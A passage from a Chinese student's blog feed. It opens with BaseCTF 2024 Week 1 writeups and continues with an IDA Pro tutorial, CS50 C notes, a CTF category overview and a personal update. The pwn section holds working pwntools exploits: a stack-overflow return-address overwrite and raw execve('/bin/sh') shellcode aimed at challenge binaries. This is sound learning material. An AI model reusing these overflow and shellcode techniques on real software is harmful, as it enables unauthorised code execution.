text"><br>而字符串大小为32<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_ret2text2.png" alt="alt text"></p><p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *context.log_level='debug'sh = remote('challenge.basectf.fun',31868)payload=b'0'*(32+8)+p64(0x4011BB)sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode3.png" alt="alt text"> </p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *context.log_level='debug'sh = process('./shellcode_level0')elf = ELF('./shellcode_level0')payload=b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_wbtdl1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_wbtdl2.png" alt="alt text"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida3.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida2.png" alt="text"></p><h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx3.png" alt="alt text"></p><h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze2.png" alt="text"> </p><pre class="line-numbers language-none"><code class="language-none">x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$$$$$$$$$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$$$$$$&amp;$$&amp;$$$$$$$$$$$&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&amp;是路,$是墙,用最短路线走到y<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p><h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor3.png" alt="alt text"> </p><p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p><p>由于</p><ol><li>key是固定生成的</li><li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li></ol><p>str如下<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor4.png" alt="alt text"> </p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;void decrypt(int *v14,int *str,int v17){    for (int i=0;i&lt;v17;i++){        printf("%d", str[i]);        str[i]=str[i]^v14[v17-i-1];        printf("%d %d\n",str[i], v14[v17-i-1]);        // printf("%d",str[i]);    }    return ;}void KeyStream(int *v4,int *v14,int a3){    for (int i=0;i&lt;a3;i++){        v14[i]=i^v4[i%3];        // printf("%c",v14[i]);    }    return;}int main(){    int v4[3]={'X','o','r'};    int v14[28]={88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67};    // int v14[28];    int v5[28];    int str[28]={1,9,5,'%','&amp;','-',0x0B,0x1D,'$','z','1',' ',0x1E,'I','=','g','M','P',8,'%','.','n',5,'4','\"','@',';','%'};    KeyStream(&amp;v4,v14,28);    decrypt(v14,str,28);    // for(int i=0;i&lt;28;i++){    //     printf("%d,", v14[i]);    // }    for(int i=0;i&lt;28;i++){        printf("%c", str[i]);    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base3.png" alt="alt text"></p><p>其加密逻辑大致是</p><ol><li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li><li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li><li>最终的密文长度,就是分组数*4</li></ol><p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p><p>这4个下标来自于明文的每3个字符</p><pre class="line-numbers language-none"><code class="language-none">// 一个字符有8bit(unsigned __int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit(HIBYTE(v15) &gt;&gt; 4) | (16 * v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit(v16 &gt;&gt; 6) | (4 * HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bitv16 &amp; 0x3F // 第三个字符的后6bit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总之,我们只要把所有的bit拼回去,就能得到flag</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">flag = "lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!"secret="/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"flag = list(flag)for i in range(len(flag)):    flag[i] = ord(flag[i]) ^ 0xEfor i in range(0, len(flag),4):    a1=secret.index(chr(flag[i])) # v15 前6位 为00111111    a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000    a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011    a4=secret.index(chr(flag[i+3])) # v17的后6位00111111    v15_1 = (a2 &amp; 0b00110000)&gt;&gt;4    v15_2 = a1&lt;&lt; 2    v15 = v15_1 | v15_2    v16_1 = (a2 &amp; 0b00001111) &lt;&lt; 4    v16_2 = (a3&amp;0b00111100) &gt;&gt; 2    v16=v16_1|v16_2    v17_1=(a3&amp;0b00000011)&lt;&lt;6    v17_2=(a4 &amp; 0b00111111)    v17=v17_1|v17_2    print(chr(v15),end='')    print(chr(v16),end= '')    print(chr(v17),end= '')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;已经收到Kengwang的礼物啦&lt;br&gt;&lt;del&gt;鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了&lt;/del&gt;&lt;br&gt;目前更新到了第一周的writeup&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://www.maonie.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>逆逆逆逆逆向-CTF之reverse</title>
    <link href="https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/"/>
    <id>https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/</id>
    <published>2024-08-05T04:10:49.000Z</published>
    <updated>2024-08-14T16:19:16.800Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类"><a href="#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类" class="headerlink" title="既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类"></a>既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类</h1><p>关键基本都在ida pro的使用<br>以及反编程后的信息搜集</p><pre class="line-numbers language-none"><code class="language-none">~目前来说有用的记录~shift+f12 查看字符串 ctrl+X 查询该字符串对应内存的相关调用f5 查看伪c代码代码中的变量直接选中后双击就可查看具体内容alt+Tida pro的环境目录内最好是纯英文 不然会出各种各样的bug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试题-BUUCTF-easyre1"><a href="#测试题-BUUCTF-easyre1" class="headerlink" title="测试题 BUUCTF-easyre1"></a>测试题 BUUCTF-easyre1</h2><span id="more"></span><p>将题目提供的exe以ida pro打开<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/1.jpg" alt="1"><br>ida pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/2.jpg" alt="2"><br>软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/3.jpg" alt="3"><br>很明显这段就是flag 输入后便能完成题目<br>目前先更到这里 后面主要讲解ida pro 的各项功能和视窗的不同 然后再来两个例题</p><h2 id="至于ida相关的介绍"><a href="#至于ida相关的介绍" class="headerlink" title="至于ida相关的介绍"></a>至于ida相关的介绍</h2><blockquote><p>主页面<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/4.jpg" alt="4"></p></blockquote><blockquote><p>函数窗口<br>可以使用 <code>ctrl+f</code> 搜索指定名称的函数<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/5.jpg" alt="5"></p></blockquote><blockquote><p>数据窗口<br>分为 <strong>视图</strong> 和 <strong>文字</strong> 两种显示方式 可以按空格来切换 文字视窗展示了一些汇编代码和地址<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/6.jpg" alt="6"><br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/7.jpg" alt="7"></p></blockquote><blockquote><p>伪代码模式（F5）<br>在汇编窗口文本模式中对着函数点F5即可弹出伪代码窗口。其是将汇编语言变成伪代码，方便阅读。<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/8.jpg" alt="8"></p></blockquote><blockquote><p>十六进制窗口<br>默认情况下，十六进制窗口显示程序内容和列表的标准十六进制代码，每行显示16个字节，以及其对应的ASCII字符。和在反汇编窗口中一样，用户也可以同时打开几个十六进制窗口<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/9.jpg" alt="9"></p></blockquote><blockquote><p>消息窗口<br>显示IDA输出的信息，用户可以通过输出信息找到文件分析有关的状态信息和操作导致的错误信息，这个窗口类似于Pycharm等软件的Console控制台。<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/10.jpg" alt="10"></p></blockquote><blockquote><p>导航栏：<br>彩色的水平带是 IDA 的概况导航栏，也叫做导航带。导航带是被加载文件地址空间的线性视图。默认情况下，它会呈现二进制文件的整个地址范围。你可以右击导航带内任何位置。在导航带上，会有一个细小的当前位置指示符（默认为黄色）指向与当前反汇编窗口中显示的地址范围对应的导航带地址。将光标悬停在导航带的任何位置，IDA 会显示一个提示，指出其在二进制文件中的对应位置。<br>简单来说，点到哪里跳到哪里，而不同的颜色代表了不同的数据段，比如说data段，text段等<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/11.jpg" alt="11"></p></blockquote><blockquote><p>参考:<a href="https://blog.csdn.net/qq_52642385/article/details/135620222">https://blog.csdn.net/qq_52642385/article/details/135620222</a></p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot;&gt;&lt;a href=&quot;#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot; class=&quot;headerlink&quot; title=&quot;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&quot;&gt;&lt;/a&gt;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&lt;/h1&gt;&lt;p&gt;关键基本都在ida pro的使用&lt;br&gt;以及反编程后的信息搜集&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;~目前来说有用的记录~
shift+f12 查看字符串 
ctrl+X 查询该字符串对应内存的相关调用
f5 查看伪c代码
代码中的变量直接选中后双击就可查看具体内容
alt+T

ida pro的环境目录内最好是纯英文 不然会出各种各样的bug&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;测试题-BUUCTF-easyre1&quot;&gt;&lt;a href=&quot;#测试题-BUUCTF-easyre1&quot; class=&quot;headerlink&quot; title=&quot;测试题 BUUCTF-easyre1&quot;&gt;&lt;/a&gt;测试题 BUUCTF-easyre1&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>求解</title>
    <link href="https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/"/>
    <id>https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/</id>
    <published>2024-07-14T05:35:44.000Z</published>
    <updated>2024-08-02T06:25:54.897Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="这里记录一下暑假两个月自学的笔记"><a href="#这里记录一下暑假两个月自学的笔记" class="headerlink" title="这里记录一下暑假两个月自学的笔记"></a>这里记录一下暑假两个月自学的笔记</h1><p>汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低<br>vscode的debugger<br>make clang debug50等用法</p><span id="more"></span><h4 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h4><p>int 数组名[数组大小]<br>数组名[从零开始的数组序号] = 变量名</p><pre class="line-numbers language-none"><code class="language-none">例int scores[3];scores[0] = 72;scores[1] = 77;scores[2] = 98;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过get_int函数达到获取int数值的作用</p><p>const是常量 定义之后无法再更改<br>例<br><code>const int n =3</code></p><p>数据在处理的时候会占用内存<br>而每段数据为了表明字符串已结束会多加一个字节<br>例： 3个字符 将占用3+1个字节</p><p>string 字符串 由char（字符） 组成<img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/image.png" alt="image"></p><p>大写和小写字母在acsii码中正好差32<br>小写转大写减去32即可<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/12.png" alt="12"></p><p>比较string用的是strcmp（string1，string2）<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/22.png" alt="22"><br>linear search 线性<br>binary search 二分<br>还有排序相关的<br>选择排序算法<br>一次一次选最小的元素 放到最左边</p><p>冒泡排序算法<br>抓出来一个和别的依次比较<br>假如大就往右移（互换位置）<br>然后依次解决</p><p>选择排序的次数是n（n-1）/2 (已编辑)<br>数量大概是n的平方</p><p>冒泡排序的次数为（n-1）（n-1）<br>这俩的上限其实都差不多<br>这俩的上界都是n方<br>下界是<br>冒泡排序在数据已经接近或已经有序的情况下<br>更有优势吧<br>感觉这俩更像是两个顺序不同的排序<br>选择排序主要是从左到右筛选<br>冒泡排序主要是从右到左</p><p>然后是在函数里套函数的情况<br>void draw(int n)<br>{}<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/31.png" alt="31"><br>归并排序<br>把数据拆成两半<br>并分别排好顺序<br>例<br>0136 2457<br>然后先看两边的第一个<br>0<br>排前面<br>现在揭露0右边的1<br>再把1和2比较<br>以此类推<br>归并会将这些数据先拆成两个两个<br>二个排序→四个排序→八个排序<br>以此类推<br>有更好的效率</p><p>%p 输出地址<br>变量名前面要加上&amp;<br>上面这个是在printf中的用法<br>定义时使用<code>*p</code> 表明p是一个指针</p><p>静态数组：静态定义的数组在程序加载的时候就已经分配了内存空间，直到函数结束或者程序结束后才会被释放；%20动态数组：由malloc()或new()等函数定义的数组，在程序运行时才申请内存空间，使用完后可以借助free()或delete()手动释放。</p><p>以scanf来获取数据</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;a href=&quot;#这里记录一下暑假两个月自学的笔记&quot; class=&quot;headerlink&quot; title=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;/a&gt;这里记录一下暑假两个月自学的笔记&lt;/h1&gt;&lt;p&gt;汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低&lt;br&gt;vscode的debugger&lt;br&gt;make clang debug50等用法&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>夺旗时间</title>
    <link href="https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/"/>
    <id>https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/</id>
    <published>2024-06-08T05:22:16.000Z</published>
    <updated>2024-06-12T06:26:07.323Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>三个月的假期准确来说还没到 在这之前 预热一下CTF的学习</p><h2 id="CTF题目类别"><a href="#CTF题目类别" class="headerlink" title="CTF题目类别"></a>CTF题目类别</h2><p>-Reverse<br>-题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>-所需知识：汇编语言、加密与解密、常见反编译工具</p><p>-Pwn<br>-Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>-所需知识：C，OD+IDA，数据结构，操作系统</p><p>-Web<br>-Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>-所需知识：PHP、Python、TCP/IP、SQL</p><p>-Crypto<br>-题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>-所需知识：矩阵、数论、密码学</p><p>-Misc<br>-Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>-所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><p>-Mobile<br>-主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>-所需知识：Java，Android 开发，常见工具</p><h2 id="至于知识点"><a href="#至于知识点" class="headerlink" title="至于知识点"></a>至于知识点</h2><p>linux基础<br>HTML基础<br>HTTP协议基础<br>JAVASCRIPT基础<br>Web服务器基础<br>Owasp漏洞基础<br>PHP代码审计基础</p><p>C/C++基础<br>汇编语言基础(我目前的努力方向)</p><h2 id="汇编语言基础相关（以x86为核心）"><a href="#汇编语言基础相关（以x86为核心）" class="headerlink" title="汇编语言基础相关（以x86为核心）"></a>汇编语言基础相关（以x86为核心）</h2></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>学学学</title>
    <link href="https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/"/>
    <id>https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/</id>
    <published>2024-06-01T01:01:38.000Z</published>
    <updated>2024-06-03T04:29:26.221Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>差不多类似于现状汇报？</p><ul><li>还活着</li><li>转段考通过了 考进大学了</li><li>目前在健身+寻找新的爱好 目标</li></ul><p>破费在阿里云里花了600多 开了个teamspeak服务器<br>嘛 至少能坚持三年 结果是令人满意的<br>至于开服的具体细节 还请自行搜索</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="告示" scheme="https://www.maonie.top/tags/%E5%91%8A%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试相关</title>
    <link href="https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
